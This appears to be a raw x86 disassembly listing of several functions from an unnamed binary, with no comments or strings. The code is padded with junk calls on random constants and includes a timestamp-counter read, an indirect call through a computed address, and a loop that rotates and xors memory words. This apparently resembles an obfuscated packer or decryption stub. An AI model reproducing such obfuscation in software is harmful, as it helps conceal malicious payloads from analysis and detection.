  408839:	and    DWORD PTR [ebp-0x10],ebx
  40883c:	mov    ebx,DWORD PTR [ebp+0xc]
  40883f:	push   0x1ef16000
  408844:	push   0x9e90b200
  408849:	call   0x40949f
  40884e:	add    esp,0x8
  408851:	mov    esi,DWORD PTR [ebp-0x4]
  408854:	add    edi,ebx
  408856:	mov    eax,DWORD PTR [ebp-0x10]
  408859:	mov    ecx,DWORD PTR ds:0x437044
  40885f:	push   0x44
  408861:	push   0x75
  408863:	push   0xb661a800
  408868:	call   0x4095af
  40886d:	add    esp,0xc
  408870:	push   0xffffffa2
  408872:	push   0x43
  408874:	push   0xee1b2800
  408879:	push   0x2f
  40887b:	push   0x1600c900
  408880:	call   0x40a101
  408885:	add    esp,0x14
  408888:	call   0x40949f
  40888d:	push   0xd21e3600
  408892:	call   0x4095af
  408897:	add    esp,0x4
  40889a:	push   0xffffff8b
  40889c:	push   0xae75f000
  4088a1:	push   0xac9d2200
  4088a6:	call   0x409afe
  4088ab:	add    esp,0xc
  4088ae:	call   0x409c22
  4088b3:	test   edi,0x2
  4088b9:	jne    0x40891f
  4088bb:	cmp    edi,0x32
  4088be:	je     0x40891f
  4088c0:	cmp    edi,0xffffffb6
  4088c3:	je     0x40891f
  4088c5:	push   0x22
  4088c7:	call   0x40a101
  4088cc:	add    esp,0x4
  4088cf:	sub    edi,ebx
  4088d1:	push   0xce1d300
  4088d6:	call   0x409167
  4088db:	add    esp,0x4
  4088de:	push   0x5c
  4088e0:	push   0x2a2c4000
  4088e5:	push   0x76431c00
  4088ea:	push   0x22198f00
  4088ef:	call   0x409e1d
  4088f4:	add    esp,0x10
  4088f7:	call   0x409afe
  4088fc:	mov    edx,DWORD PTR [ebp-0x10]
  4088ff:	cmp    edx,0xffffffbc
  408902:	je     0x40891f
  408904:	sub    DWORD PTR [ebp-0x10],edx
  408907:	mov    eax,DWORD PTR ds:0x437044
  40890d:	mov    DWORD PTR [ebp-0x10],edi
  408910:	push   0xffffff9d
  408912:	push   0x7cf76f00
  408917:	call   0x409167
  40891c:	add    esp,0x8
  40891f:	mov    DWORD PTR [ebx+0x0],esi
  408922:	push   0x33
  408924:	push   0xffffff9a
  408926:	push   0xee35e800
  40892b:	call   0x40a101
  408930:	add    esp,0xc
  408933:	push   0x7e
  408935:	push   0x7c855d00
  40893a:	push   0x7b
  40893c:	call   0x40949f
  408941:	add    esp,0xc
  408944:	push   0xffffffc7
  408946:	push   0xba275a00
  40894b:	push   0xa60f5900
  408950:	push   0x47
  408952:	call   0x409c22
  408957:	add    esp,0x10
  40895a:	pop    edi
  40895b:	test   edi,0xea
  408961:	je     0x408979
  408963:	push   0x48
  408965:	push   0x9e50e900
  40896a:	push   0x26e40300
  40896f:	push   0xffffff87
  408971:	call   0x409350
  408976:	add    esp,0x10
  408979:	call   0x40a101
  40897e:	pop    esi
  40897f:	mov    eax,DWORD PTR [ebp-0x10]
  408982:	mov    edx,0x64
  408987:	push   0x42571800
  40898c:	push   0x5a764c00
  408991:	push   0xccb0a00
  408996:	push   0x45
  408998:	call   0x409350
  40899d:	add    esp,0x10
  4089a0:	push   0x4c949400
  4089a5:	push   0x5cd0ff00
  4089aa:	call   0x40a101
  4089af:	add    esp,0x8
  4089b2:	pop    ebx
  4089b3:	push   0xffffff85
  4089b5:	push   0xffffffab
  4089b7:	push   0xffffffda
  4089b9:	call   0x409350
  4089be:	add    esp,0xc
  4089c1:	leave  
  4089c2:	ret    0x8
  4089c5:	int3   
  4089c6:	int3   
  4089c7:	int3   
  4089c8:	int3   
  4089c9:	int3   
  4089ca:	push   ebp
  4089cb:	mov    ebp,esp
  4089cd:	sub    esp,0x2c
  4089d0:	push   0x59
  4089d2:	push   0x21
  4089d4:	push   0x31bdd400
  4089d9:	push   0x233bca00
  4089de:	push   0xffffffd7
  4089e0:	call   0x40949f
  4089e5:	add    esp,0x14
  4089e8:	push   0x31199e00
  4089ed:	push   0xffffff98
  4089ef:	call   0x409167
  4089f4:	add    esp,0x8
  4089f7:	push   ebx
  4089f8:	push   0x89979d00
  4089fd:	push   0xffffffe5
  4089ff:	push   0x6de6ca00
  408a04:	call   0x409350
  408a09:	add    esp,0xc
  408a0c:	push   esi
  408a0d:	push   0x30
  408a0f:	push   0x38
  408a11:	push   0xffffff86
  408a13:	push   0x3128cd00
  408a18:	push   0x21
  408a1a:	call   0x409c22
  408a1f:	add    esp,0x14
  408a22:	push   0x93026a00
  408a27:	push   0xb347c600
  408a2c:	push   0x29776900
  408a31:	push   0x19f00d00
  408a36:	call   0x409afe
  408a3b:	add    esp,0x10
  408a3e:	push   edi
  408a3f:	cmp    eax,DWORD PTR [ebp-0x18]
  408a42:	jne    0x408a53
  408a44:	xor    eax,eax
  408a46:	push   0xd33f5600
  408a4b:	call   0x40a101
  408a50:	add    esp,0x4
  408a53:	mov    DWORD PTR [ebp-0x10],eax
  408a56:	push   0x45e85f00
  408a5b:	push   0xffffffab
  408a5d:	call   0x40949f
  408a62:	add    esp,0x8
  408a65:	cmp    eax,0xfffffff0
  408a68:	je     0x408a6f
  408a6a:	call   0x40949f
  408a6f:	push   0x85c43700
  408a74:	call   0x409afe
  408a79:	add    esp,0x4
  408a7c:	rdtsc  
  408a7e:	xor    DWORD PTR [ebp-0x10],edx
  408a81:	and    DWORD PTR [ebp-0x10],edx
  408a84:	mov    ebx,DWORD PTR [ebp-0x10]
  408a87:	sub    ebx,edx
  408a89:	sub    DWORD PTR [ebp-0x10],ebx
  408a8c:	pop    edi
  408a8d:	sub    ebx,edx
  408a8f:	or     ebx,edi
  408a91:	sub    ebx,edx
  408a93:	mov    ecx,DWORD PTR [ebp-0x10]
  408a96:	mov    esi,DWORD PTR ds:0x437050
  408a9c:	mov    DWORD PTR [ebp-0x8],ebx
  408a9f:	add    DWORD PTR [ebp-0x10],ecx
  408aa2:	add    DWORD PTR [ebp-0x10],esi
  408aa5:	pop    esi
  408aa6:	mov    edx,0x77
  408aab:	or     DWORD PTR [ebp-0x8],ecx
  408aae:	add    DWORD PTR [ebp-0x10],eax
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	sub    DWORD PTR [ebp-0x8],edx
  408ab7:	or     DWORD PTR [ebp-0x8],ecx
  408aba:	pop    ebx
  408abb:	sub    edx,eax
  408abd:	mov    ecx,DWORD PTR ds:0x437068
  408ac3:	sub    ecx,edi
  408ac5:	add    ecx,eax
  408ac7:	add    edx,edi
  408ac9:	cmp    esi,DWORD PTR [ebp-0x14]
  408acc:	jne    0x408b3d
  408ace:	sub    DWORD PTR [ebp-0x10],ecx
  408ad1:	or     edx,edi
  408ad3:	and    edx,eax
  408ad5:	and    edx,eax
  408ad7:	add    edx,edi
  408ad9:	mov    ecx,DWORD PTR ds:0x437050
  408adf:	xor    DWORD PTR [ebp-0x10],ebx
  408ae2:	add    DWORD PTR [ebp-0x8],edx
  408ae5:	mov    edx,edi
  408ae7:	sub    ecx,ebx
  408ae9:	add    ecx,ebx
  408aeb:	add    ecx,eax
  408aed:	cmp    esi,0xffffffd8
  408af0:	je     0x408b3d
  408af2:	cmp    edx,0x6bfb
  408af8:	je     0x408b3d
  408afa:	add    edx,edx
  408afc:	cmp    edx,DWORD PTR ds:0x437068
  408b02:	je     0x408b3d
  408b04:	add    ecx,esi
  408b06:	and    ecx,ebx
  408b08:	cmp    edi,DWORD PTR [ebp-0x2c]
  408b0b:	je     0x408b3d
  408b0d:	cmp    ecx,0x4667
  408b13:	jne    0x408b3d
  408b15:	and    DWORD PTR [ebp-0x10],edx
  408b18:	mov    edx,DWORD PTR [ebp-0x8]
  408b1b:	cmp    ecx,0xffffffd2
  408b1e:	je     0x408b3d
  408b20:	test   edx,0xc5f
  408b26:	jne    0x408b3d
  408b28:	add    DWORD PTR [ebp-0x10],edx
  408b2b:	mov    edx,DWORD PTR [ebp-0x8]
  408b2e:	add    edx,ebx
  408b30:	sub    edx,edi
  408b32:	xor    DWORD PTR [ebp-0x10],esi
  408b35:	add    ecx,eax
  408b37:	sub    DWORD PTR [ebp-0x8],edx
  408b3a:	sub    DWORD PTR [ebp-0x10],ecx
  408b3d:	leave  
  408b3e:	ret    
  408b3f:	int3   
  408b40:	int3   
  408b41:	int3   
  408b42:	int3   
  408b43:	int3   
  408b44:	push   ebp
  408b45:	mov    ebp,esp
  408b47:	sub    esp,0x2c
  408b4a:	push   0x0
  408b4c:	call   0x409350
  408b51:	add    esp,0x4
  408b54:	call   0x40949f
  408b59:	push   ebx
  408b5a:	push   0xe9708700
  408b5f:	push   0x5f
  408b61:	push   0xf3777600
  408b66:	push   0x1153d200
  408b6b:	push   0xffffffbd
  408b6d:	call   0x409e1d
  408b72:	add    esp,0x14
  408b75:	push   0x19f58000
  408b7a:	call   0x409c22
  408b7f:	add    esp,0x4
  408b82:	push   esi
  408b83:	mov    ecx,0x55802048
  408b88:	push   0x312dd300
  408b8d:	push   0xfffffff5
  408b8f:	call   0x40a101
  408b94:	add    esp,0x8
  408b97:	push   edi
  408b98:	push   0x44
  408b9a:	push   0xffffffd2
  408b9c:	push   0xffffff99
  408b9e:	push   0xffffff97
  408ba0:	push   0x317d4a00
  408ba5:	call   0x409afe
  408baa:	add    esp,0x14
  408bad:	call   0x409c22
  408bb2:	push   0x13607f00
  408bb7:	push   0xffffffa1
  408bb9:	push   0x7a
  408bbb:	push   0xe343d700
  408bc0:	push   0x69
  408bc2:	call   0x40949f
  408bc7:	add    esp,0x14
  408bca:	push   0x314b4c00
  408bcf:	push   0x75cb9a00
  408bd4:	push   0xfdd38600
  408bd9:	push   0xa9db3c00
  408bde:	push   0x20
  408be0:	call   0x409afe
  408be5:	add    esp,0x14
  408be8:	mov    edx,DWORD PTR [ebp+0x10]
  408beb:	add    eax,edx
  408bed:	mov    DWORD PTR [ebp-0x20],eax
  408bf0:	mov    eax,DWORD PTR [ebp+0x8]
  408bf3:	mov    ebx,DWORD PTR [ebp-0x20]
  408bf6:	mov    edi,DWORD PTR [ebp-0x20]
  408bf9:	sub    DWORD PTR [ebp-0x20],edi
  408bfc:	add    DWORD PTR [ebp-0x20],eax
  408bff:	add    ebx,edi
  408c01:	add    ebx,ebx
  408c03:	and    DWORD PTR [ebp-0x20],ebx
  408c06:	cmp    DWORD PTR [ebp+0xc],edx
  408c09:	je     0x408d3a
  408c0f:	mov    esi,DWORD PTR [ebp-0x20]
  408c12:	sub    DWORD PTR [ebp-0x20],esi
  408c15:	dec    DWORD PTR [ebp+0xc]
  408c18:	and    ebx,edx
  408c1a:	cmp    ebx,0xfffffff9
  408c1d:	je     0x408cb1
  408c23:	cmp    edx,DWORD PTR [ebp-0x18]
  408c26:	jne    0x408cb1
  408c2c:	mov    esi,DWORD PTR [ebp-0x20]
  408c2f:	cmp    ebx,0xffffff98
  408c32:	je     0x408cb1
  408c34:	and    ebx,edi
  408c36:	add    esi,esi
  408c38:	mov    edi,DWORD PTR [ebp-0x20]
  408c3b:	add    edi,esi
  408c3d:	mov    ecx,DWORD PTR [ebp-0x20]
  408c40:	sub    DWORD PTR [ebp-0x20],ebx
  408c43:	add    ecx,ebx
  408c45:	sub    DWORD PTR [ebp-0x20],ecx
  408c48:	and    edi,edx
  408c4a:	add    edi,edi
  408c4c:	add    edi,esi
  408c4e:	add    edi,esi
  408c50:	cmp    edi,DWORD PTR [ebp-0xc]
  408c53:	jne    0x408cb1
  408c55:	cmp    edi,eax
  408c57:	jne    0x408cb1
  408c59:	cmp    edi,ebx
  408c5b:	jne    0x408cb1
  408c5d:	mov    ebx,0xb4
  408c62:	mov    ecx,ebx
  408c64:	sub    edi,esi
  408c66:	add    ecx,eax
  408c68:	add    DWORD PTR [ebp-0x20],edi
  408c6b:	cmp    eax,DWORD PTR [ebp-0xc]
  408c6e:	jne    0x408cb1
  408c70:	mov    edi,DWORD PTR [ebp-0x20]
  408c73:	add    ecx,edi
  408c75:	mov    esi,DWORD PTR [ebp-0x20]
  408c78:	test   ecx,0x18
  408c7e:	je     0x408cb1
  408c80:	mov    ebx,0xc7
  408c85:	mov    DWORD PTR [ebp-0x20],eax
  408c88:	sub    DWORD PTR [ebp-0x20],ebx
  408c8b:	add    DWORD PTR [ebp-0x20],esi
  408c8e:	mov    ebx,DWORD PTR [ebp-0x20]
  408c91:	mov    DWORD PTR [ebp-0x1c],ebx
  408c94:	test   ecx,0xcb5b
  408c9a:	jne    0x408cb1
  408c9c:	mov    edi,0x32
  408ca1:	mov    esi,DWORD PTR [ebp-0x20]
  408ca4:	and    edi,edx
  408ca6:	add    DWORD PTR [ebp-0x1c],esi
  408ca9:	sub    DWORD PTR [ebp-0x20],ecx
  408cac:	add    edi,eax
  408cae:	sub    DWORD PTR [ebp-0x1c],edi
  408cb1:	ror    DWORD PTR [eax],0x1f
  408cb4:	add    esi,edx
  408cb6:	mov    edi,DWORD PTR [ebp-0x20]
  408cb9:	mov    ecx,0xbc
  408cbe:	cmp    edi,0xffffffbd
  408cc1:	jne    0x408cff
  408cc3:	and    DWORD PTR [ebp-0x20],ecx
  408cc6:	cmp    edi,DWORD PTR [ebp-0x28]
  408cc9:	je     0x408cff
  408ccb:	mov    ecx,0xc0
  408cd0:	sub    DWORD PTR [ebp-0x20],ecx
  408cd3:	cmp    edi,ecx
  408cd5:	jne    0x408cff
  408cd7:	cmp    edi,ebx
  408cd9:	jne    0x408cff
  408cdb:	mov    ecx,DWORD PTR [ebp-0x20]
  408cde:	cmp    edi,0x5a
  408ce1:	jne    0x408cff
  408ce3:	and    ecx,edi
  408ce5:	cmp    esi,ecx
  408ce7:	je     0x408cff
  408ce9:	mov    edi,DWORD PTR [ebp-0x20]
  408cec:	add    DWORD PTR [ebp-0x20],edi
  408cef:	sub    esi,edx
  408cf1:	mov    edi,DWORD PTR [ebp-0x20]
  408cf4:	add    DWORD PTR [ebp-0x20],esi
  408cf7:	and    edi,edx
  408cf9:	mov    DWORD PTR [ebp-0x2c],edi
  408cfc:	add    DWORD PTR [ebp-0x2c],ecx
  408cff:	xor    DWORD PTR [eax],edx
  408d01:	mov    edi,0x8c
  408d06:	mov    ebx,DWORD PTR [ebp-0x20]
  408d09:	add    DWORD PTR [ebp-0x20],eax
  408d0c:	sub    DWORD PTR [ebp-0x20],edi
  408d0f:	sub    DWORD PTR [ebp-0x20],ebx
  408d12:	neg    DWORD PTR [eax]
  408d14:	mov    edi,DWORD PTR [ebp-0x20]
  408d17:	cmp    edi,0xffffffb1
  408d1a:	je     0x408d21
  408d1c:	sub    edi,edx
  408d1e:	or     DWORD PTR [ebp-0x20],edi
  408d21:	ror    DWORD PTR [eax],0x12
  408d24:	cmp    esi,0xa5e9
  408d2a:	jne    0x408d2f
  408d2c:	add    DWORD PTR [ebp-0x20],edi
  408d2f:	add    eax,0x4
  408d32:	or     DWORD PTR [ebp-0x20],eax
  408d35:	jmp    0x408bf3
  408d3a:	push   0x58
  408d3c:	push   0x29788200
  408d41:	push   0x1f
  408d43:	push   0x61f60100
  408d48:	call   0x409c22
  408d4d:	add    esp,0x10
  408d50:	sub    DWORD PTR [ebp-0x20],eax
  408d53:	push   0xffffffdc
  408d55:	push   0x75b20e00
  408d5a:	push   0xfde81300
  408d5f:	call   0x409afe
  408d64:	add    esp,0xc
  408d67:	xor    ecx,ecx
  408d69:	mov    eax,0xda1f
  408d6e:	push   0x89dba800
  408d73:	push   0xc593e700
  408d78:	push   0x25bc4b00
  408d7d:	push   0xd1d1ba00
  408d82:	push   0xa91e7800
  408d87:	call   0x409c22
  408d8c:	add    esp,0x14
  408d8f:	push   0x2b
  408d91:	call   0x409e1d
  408d96:	add    esp,0x4
  408d99:	pop    edi
  408d9a:	call   0x40a101
  408d9f:	call   0x409afe
  408da4:	pop    esi
  408da5:	mov    eax,DWORD PTR [ebp-0x20]
  408da8:	push   0x29f32200
  408dad:	call   0x40949f
  408db2:	add    esp,0x4
  408db5:	push   0x39d0cb00
  408dba:	push   0xffffffba
  408dbc:	call   0x409e1d
  408dc1:	add    esp,0x8
  408dc4:	pop    ebx
  408dc5:	add    eax,esi
  408dc7:	sub    eax,ebx
  408dc9:	push   0xffffffbd
  408dcb:	push   0xffffffc3
  408dcd:	push   0xffffff9d
  408dcf:	push   0x3149d700
  408dd4:	call   0x409167
  408dd9:	add    esp,0x10
  408ddc:	leave  
  408ddd:	ret    0xc
  408de0:	int3   
  408de1:	int3   
  408de2:	int3   
  408de3:	int3   
  408de4:	int3   
  408de5:	push   ebp
  408de6:	mov    ebp,esp
  408de8:	sub    esp,0x28
  408deb:	push   0xc363b600
  408df0:	call   0x409350
  408df5:	add    esp,0x4
  408df8:	push   0x7
  408dfa:	call   0x409e1d
  408dff:	add    esp,0x4
  408e02:	push   ebx
  408e03:	mov    ecx,0x18
  408e08:	add    ecx,eax
  408e0a:	call   0x40949f
  408e0f:	push   esi
  408e10:	call   0x409350
  408e15:	push   0x6f
  408e17:	push   0x79d8d800
  408e1c:	push   0x4b
  408e1e:	push   0x7dabcf00
  408e23:	call   0x409c22
  408e28:	add    esp,0x10
  408e2b:	push   edi
  408e2c:	mov    DWORD PTR [ebp-0x1c],eax
  408e2f:	push   0x116f3500
  408e34:	push   0x115be300
  408e39:	call   0x40a101
  408e3e:	add    esp,0x8
  408e41:	push   0xd3181100
  408e46:	push   0xffffff8a
  408e48:	push   0xffffffa9
  408e4a:	push   0xbdf1d200
  408e4f:	call   0x4095af
  408e54:	add    esp,0x10
  408e57:	mov    ecx,0x3e6e381a
  408e5c:	add    eax,ecx
  408e5e:	and    eax,ecx
  408e60:	add    DWORD PTR [ebp-0x1c],eax
  408e63:	sub    ecx,0x3e6e37da
  408e69:	sub    DWORD PTR [ebp-0x1c],eax
  408e6c:	push   ecx
  408e6d:	mov    esi,DWORD PTR [ebp-0x1c]
  408e70:	xor    DWORD PTR [ebp-0x1c],eax
  408e73:	call   0x409c22
  408e78:	cmp    esi,0xffffffd7
  408e7b:	je     0x408e80
  408e7d:	add    DWORD PTR [ebp-0x1c],esi
  408e80:	push   0xffffff8d
  408e82:	push   0x1e
  408e84:	push   0xa1d89700
  408e89:	call   0x409350
  408e8e:	add    esp,0xc
  408e91:	mov    ecx,0xfc207e43
  408e96:	mov    edx,DWORD PTR [ebp-0x1c]
  408e99:	cmp    edx,0xffffff8d
  408e9c:	jne    0x408ed0
  408e9e:	sub    DWORD PTR [ebp-0x1c],ecx
  408ea1:	test   esi,0xca
  408ea7:	je     0x408ed0
  408ea9:	mov    eax,DWORD PTR [ebp-0x1c]
  408eac:	add    DWORD PTR [ebp-0x1c],eax
  408eaf:	cmp    edx,ecx
  408eb1:	je     0x408ed0
  408eb3:	or     DWORD PTR [ebp-0x1c],ecx
  408eb6:	mov    ebx,0xf3
  408ebb:	sub    ebx,esi
  408ebd:	mov    edi,DWORD PTR [ebp-0x1c]
  408ec0:	or     edi,edx
  408ec2:	sub    edi,eax
  408ec4:	or     DWORD PTR [ebp-0x1c],ebx
  408ec7:	sub    edi,ecx
  408ec9:	sub    edi,ebx
  408ecb:	sub    edi,eax
  408ecd:	add    DWORD PTR [ebp-0x1c],edi
  408ed0:	add    ecx,0x3df91bd
  408ed6:	add    DWORD PTR [ebp-0x1c],ecx
  408ed9:	push   ecx
  408eda:	and    DWORD PTR [ebp-0x1c],ecx
  408edd:	push   0x5338c
  408ee2:	cmp    eax,0xee7a
  408ee7:	jne    0x408ef3
  408ee9:	push   0xffffffb8
  408eeb:	call   0x409350
  408ef0:	add    esp,0x4
  408ef3:	push   0xffffffa8
  408ef5:	push   0x3
  408ef7:	push   0x58
  408ef9:	call   0x409350
  408efe:	add    esp,0xc
  408f01:	push   0x0
  408f03:	cmp    edi,0xffffffe0
  408f06:	je     0x408f99
  408f0c:	mov    edi,0x78
  408f11:	sub    edi,esi
  408f13:	mov    edx,DWORD PTR [ebp-0x1c]
  408f16:	push   0x313ea600
  408f1b:	push   0xffffffb0
  408f1d:	call   0x409c22
  408f22:	add    esp,0x8
  408f25:	push   0x630db100
  408f2a:	push   0xffffffab
  408f2c:	push   0xfde7ab00
  408f31:	push   0xffffffba
  408f33:	call   0x409c22
  408f38:	add    esp,0x10
  408f3b:	push   0xffffff91
  408f3d:	push   0x697dfd00
  408f42:	push   0xffffffbd
  408f44:	push   0xa
  408f46:	call   0x409c22
  408f4b:	add    esp,0x10
  408f4e:	sub    edi,eax
  408f50:	push   0x29788400
  408f55:	push   0xfffffff2
  408f57:	push   0xd1f57d00
  408f5c:	call   0x40a101
  408f61:	add    esp,0xc
  408f64:	cmp    esi,0xe35e
  408f6a:	je     0x408f99
  408f6c:	cmp    ebx,DWORD PTR [ebp-0x14]
  408f6f:	jne    0x408f99
  408f71:	add    edi,eax
  408f73:	call   0x409167
  408f78:	push   0x1f
  408f7a:	push   0xffffffef
  408f7c:	push   0x69769700
  408f81:	push   0x5f
  408f83:	push   0x4340be00
  408f88:	call   0x409350
  408f8d:	add    esp,0x14
  408f90:	sub    edi,eax
  408f92:	cmp    ebx,esi
  408f94:	je     0x408f99
  408f96:	sub    DWORD PTR [ebp-0x1c],edi
  408f99:	push   0xfdf71900
  408f9e:	push   0x315e6200
  408fa3:	push   0xb5ca3800
  408fa8:	call   0x409afe
  408fad:	add    esp,0xc
  408fb0:	mov    edx,0xe2cfd80d
  408fb5:	mov    ecx,DWORD PTR [ebp-0x1c]
  408fb8:	mov    edi,0x74
  408fbd:	mov    DWORD PTR [ebp-0x1c],edi
  408fc0:	and    DWORD PTR [ebp-0x1c],ecx
  408fc3:	sub    edx,0xe28e65cd
  408fc9:	or     DWORD PTR [ebp-0x1c],ecx
  408fcc:	call   DWORD PTR [edx]
  408fce:	add    DWORD PTR [ebp-0x1c],ebx
  408fd1:	mov    DWORD PTR [ebp-0x28],eax
  408fd4:	call   0x4095af
  408fd9:	mov    edx,0xa6cf4ef8
  408fde:	sub    DWORD PTR [ebp-0x1c],edx
  408fe1:	add    edx,0x59742108
  408fe7:	mov    ebx,DWORD PTR [ebp-0x1c]
  408fea:	sub    DWORD PTR [ebp-0x1c],esi
  408fed:	sub    DWORD PTR [ebp-0x1c],edx
  408ff0:	cmp    ebx,0xffffffd9
  408ff3:	je     0x409012
  408ff5:	add    ebx,edx
  408ff7:	sub    ebx,esi
  408ff9:	mov    eax,edx
  408ffb:	mov    esi,DWORD PTR ds:0x437054
  409001:	and    esi,ebx
  409003:	add    esi,ebx
  409005:	add    DWORD PTR [ebp-0x1c],ebx
  409008:	sub    DWORD PTR [ebp-0x1c],eax
  40900b:	add    esi,eax
  40900d:	add    esi,edx
  40900f:	add    DWORD PTR [ebp-0x1c],esi
  409012:	mov    DWORD PTR [ebp-0x8],edx
  409015:	call   0x409350
  40901a:	push   0x4
  40901c:	call   0x409c22
  409021:	add    esp,0x4
  409024:	mov    edi,DWORD PTR [ebp-0x28]
  409027:	push   0x63
  409029:	call   0x409c22
  40902e:	add    esp,0x4
  409031:	push   0x6db36700
  409036:	push   0x518d3f00
  40903b:	push   0x3143f900
  409040:	call   0x409afe
  409045:	add    esp,0xc
  409048:	or     DWORD PTR [ebp-0x1c],edi
  40904b:	mov    ebx,DWORD PTR [ebp-0x8]
  40904e:	sub    esi,ebx
  409050:	add    DWORD PTR [ebp-0x1c],esi
  409053:	mov    esi,DWORD PTR [ebx]
  409055:	add    eax,edi
  409057:	mov    edx,DWORD PTR [ebp-0x1c]
  40905a:	call   0x40a101
  40905f:	mov    ecx,DWORD PTR [ebx+0x4]
  409062:	add    eax,ebx
  409064:	cmp    ecx,0x5
  409067:	jne    0x409096
  409069:	cmp    esi,DWORD PTR ds:0x437054
  40906f:	je     0x409096
  409071:	mov    ebx,DWORD PTR ds:0x437054
  409077:	and    ebx,eax
  409079:	mov    edx,DWORD PTR ds:0x437054
  40907f:	sub    DWORD PTR [ebp-0x1c],esi
  409082:	cmp    eax,DWORD PTR [ebp-0x4]
  409085:	je     0x409096
  409087:	mov    eax,DWORD PTR [ebp-0x1c]
  40908a:	xor    DWORD PTR [ebp-0x1c],ecx
  40908d:	sub    DWORD PTR [ebp-0x1c],ebx
  409090:	add    DWORD PTR [ebp-0x1c],eax
  409093:	sub    DWORD PTR [ebp-0x1c],edx
  409096:	or     esi,esi
  409098:	je     0x4090cb
  40909a:	mov    eax,edx
  40909c:	add    DWORD PTR [ebp-0x1c],eax
  40909f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a1:	push   0xb35f2d00
  4090a6:	push   0x1d927700
  4090ab:	push   0xa342bf00
  4090b0:	push   0x3144d000
  4090b5:	push   0xffffff8a
  4090b7:	call   0x409afe
  4090bc:	add    esp,0x14
  4090bf:	add    DWORD PTR [ebp-0x8],0x8
  4090c3:	sub    DWORD PTR [ebp-0x1c],esi
  4090c6:	jmp    0x409027
  4090cb:	push   0x36
  4090cd:	push   0x43427000
  4090d2:	call   0x40a101
  4090d7:	add    esp,0x8
  4090da:	xor    edx,edx
  4090dc:	mov    ecx,0x60
  4090e1:	push   0x38
  4090e3:	push   0xffffffb1
  4090e5:	call   0x4095af
  4090ea:	add    esp,0x8
  4090ed:	mov    eax,DWORD PTR [ebp-0x28]
  4090f0:	add    DWORD PTR [ebp-0x1c],eax
  4090f3:	mov    esi,0x740f
  4090f8:	mov    edx,eax
  4090fa:	add    esi,edx
  4090fc:	add    DWORD PTR [ebp-0x1c],edx
  4090ff:	add    esi,esi
  409101:	or     esi,edx
  409103:	cmp    edx,DWORD PTR [ebp-0x4]
  409106:	je     0x40910e
  409108:	sub    DWORD PTR [ebp-0x1c],edx
  40910b:	sub    DWORD PTR [ebp-0x1c],esi
  40910e:	pop    edi
  40910f:	sub    esi,eax
  409111:	cmp    esi,0x1a29000
  409117:	jne    0x40912b
  409119:	cmp    esi,DWORD PTR ds:0x437054
  40911f:	je     0x40912b
  409121:	sub    esi,edi
  409123:	cmp    esi,DWORD PTR [ebp-0x1c]
  409126:	je     0x40912b
  409128:	add    DWORD PTR [ebp-0x1c],esi
  40912b:	pop    esi
  40912c:	mov    ebx,DWORD PTR ds:0x437054
  409132:	xor    edx,edx
  409134:	cmp    esi,DWORD PTR [ebp-0xc]
  409137:	jne    0x40913c
  409139:	add    DWORD PTR [ebp-0x1c],esi
  40913c:	add    ebx,eax
  40913e:	add    DWORD PTR [ebp-0x1c],eax
  409141:	add    DWORD PTR [ebp-0x1c],edx
  409144:	or     DWORD PTR [ebp-0x1c],ebx
  409147:	pop    ebx
  409148:	mov    edx,DWORD PTR ds:0x437054
  40914e:	add    DWORD PTR [ebp-0x1c],ebx
  409151:	mov    ecx,DWORD PTR [ebp-0x1c]
  409154:	sub    ecx,edi
  409156:	cmp    ecx,DWORD PTR [ebp-0x1c]
  409159:	jne    0x409160
  40915b:	sub    edx,ecx
  40915d:	sub    DWORD PTR [ebp-0x1c],edx
  409160:	leave  
  409161:	ret    
  409162:	int3   
  409163:	int3   
  409164:	int3   
  409165:	int3   
  409166:	int3   
  409167:	push   ebp
  409168:	mov    ebp,esp
  40916a:	sub    esp,0x40
  40916d:	xor    ecx,ecx
  40916f:	mov    edx,0x35
  409174:	push   0xffffff97
  409176:	push   0x49
  409178:	push   0xb1e66600
  40917d:	push   0xa330cd00
  409182:	call   0x409e1d
  409187:	add    esp,0x10
  40918a:	call   0x4095af
  40918f:	push   ebx
  409190:	mov    DWORD PTR [ebp-0x40],eax
  409193:	call   0x409c22
  409198:	push   esi
  409199:	push   0xffffffdc
  40919b:	push   0x11627000
  4091a0:	call   0x4095af
  4091a5:	add    esp,0x8
  4091a8:	push   edi
  4091a9:	add    DWORD PTR [ebp-0x40],eax
  4091ac:	cmp    eax,0xffffffb5
  4091af:	je     0x4091c6
  4091b1:	push   0x1c
  4091b3:	push   0x49
  4091b5:	push   0x53305200
  4091ba:	push   0xffffffaa
  4091bc:	push   0x23
  4091be:	call   0x409c22
  4091c3:	add    esp,0x14
  4091c6:	push   0x65
  4091c8:	push   0x74
  4091ca:	push   0xffffffaa
  4091cc:	push   0x819fe600
  4091d1:	push   0xa5d5b600
  4091d6:	call   0x409350
  4091db:	add    esp,0x14
  4091de:	push   0x694b4700
  4091e3:	push   0x39fc3c00
  4091e8:	push   0x4df83600
  4091ed:	push   0xffffff90
  4091ef:	call   0x40949f
  4091f4:	add    esp,0x10
  4091f7:	cmp    eax,DWORD PTR [ebp-0x1c]
  4091fa:	jne    0x40920b
  4091fc:	push   0xc32a8c00
  409201:	push   0xffffffea
  409203:	call   0x40a101
  409208:	add    esp,0x8
  40920b:	add    DWORD PTR [ebp-0x40],eax
  40920e:	pop    edi
  40920f:	mov    esi,DWORD PTR [ebp-0x40]
  409212:	push   0x66
  409214:	push   0x4b
  409216:	push   0xffffffb3
  409218:	push   0xffffff8e
  40921a:	call   0x40a101
  40921f:	add    esp,0x10
  409222:	cmp    esi,DWORD PTR [ebp-0x28]
  409225:	je     0x409316
  40922b:	and    esi,eax
  40922d:	push   0x75
  40922f:	push   0x71b91000
  409234:	push   0xffffffa8
  409236:	push   0x21c57c00
  40923b:	push   0x9354c300
  409240:	call   0x40a101
  409245:	add    esp,0x14
  409248:	push   0xffffffad
  40924a:	push   0x69048400
  40924f:	call   0x4095af
  409254:	add    esp,0x8
  409257:	push   0x63
  409259:	push   0xffffff93
  40925b:	push   0xfffffff0
  40925d:	call   0x409350
  409262:	add    esp,0xc
  409265:	mov    ecx,eax
  409267:	push   0xffffffe9
  409269:	push   0xffffffa7
  40926b:	call   0x409e1d
  409270:	add    esp,0x8
  409273:	push   0x71
  409275:	push   0x29bfed00
  40927a:	push   0x2f
  40927c:	call   0x409c22
  409281:	add    esp,0xc
  409284:	push   0x9afac00
  409289:	push   0xf311dd00
  40928e:	push   0x29285a00
  409293:	push   0x39
  409295:	push   0x932c0c00
  40929a:	call   0x40a101
